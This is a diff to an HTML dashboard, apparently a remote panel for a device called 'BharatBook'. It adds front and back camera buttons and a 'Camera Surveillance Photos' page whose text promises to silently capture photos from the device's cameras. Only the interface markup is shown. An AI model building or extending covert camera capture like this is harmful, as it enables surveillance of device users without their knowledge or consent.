@@ -49,6 +49,9 @@
             <button class="nav-item" data-page="screenshots" onclick="switchPage('screenshots')">
                 📸<span class="tooltip">Screenshots</span>
             </button>
+            <button class="nav-item" data-page="camera" onclick="switchPage('camera')">
+                🤳<span class="tooltip">Camera Photos</span>
+            </button>
             <button class="nav-item" data-page="activity" onclick="switchPage('activity')">
                 📜<span class="tooltip">Activity</span>
             </button>
@@ -76,6 +79,9 @@
         </button>
         <button class="nav-item" data-page="screenshots" onclick="switchPage('screenshots')">
             📸<span class="nav-label">Captures</span>
+        </button>
+        <button class="nav-item" data-page="camera" onclick="switchPage('camera')">
+            🤳<span class="nav-label">Camera</span>
         </button>
         <button class="nav-item" data-page="activity" onclick="switchPage('activity')">
             📜<span class="nav-label">Activity</span>
@@ -176,6 +182,14 @@
                     <div class="icon">📸</div>
                     <span>Take Screenshot</span>
                 </button>
+                <button class="action-btn camera-front" id="btnCameraFront" onclick="takePhoto('front')">
+                    <div class="icon">🤳</div>
+                    <span>Front Photo</span>
+                </button>
+                <button class="action-btn camera-back" id="btnCameraBack" onclick="takePhoto('back')">
+                    <div class="icon">📷</div>
+                    <span>Back Photo</span>
+                </button>
                 <button class="action-btn lock" id="btnLock" onclick="lockDevice()">
                     <div class="icon">🔒</div>
                     <span>Lock Device</span>
@@ -235,6 +249,30 @@
                     <div class="empty-icon">📸</div>
                     <h3>No screenshots captured</h3>
                     <p>Take a screenshot using the button above to see what's happening on the BharatBook</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- ═══════ CAMERA PHOTOS PAGE ═══════ -->
+        <div id="cameraPage" class="page">
+            <div class="screenshots-header">
+                <h2 class="page-title">Camera Surveillance Photos</h2>
+                <div style="display: flex; gap: 10px;">
+                    <button class="action-btn camera-front" onclick="takePhoto('front')">
+                        <div class="icon">🤳</div>
+                        <span>Front Capture</span>
+                    </button>
+                    <button class="action-btn camera-back" onclick="takePhoto('back')">
+                        <div class="icon">📷</div>
+                        <span>Back Capture</span>
+                    </button>
+                </div>
+            </div>
+            <div class="screenshots-grid" id="cameraGrid">
+                <div class="empty-state" style="grid-column: 1/-1">
+                    <div class="empty-icon">🤳</div>
+                    <h3>No camera photos captured</h3>
+                    <p>Use the buttons above to silently capture photos from the device front or back camera</p>
                 </div>
             </div>
         </div>
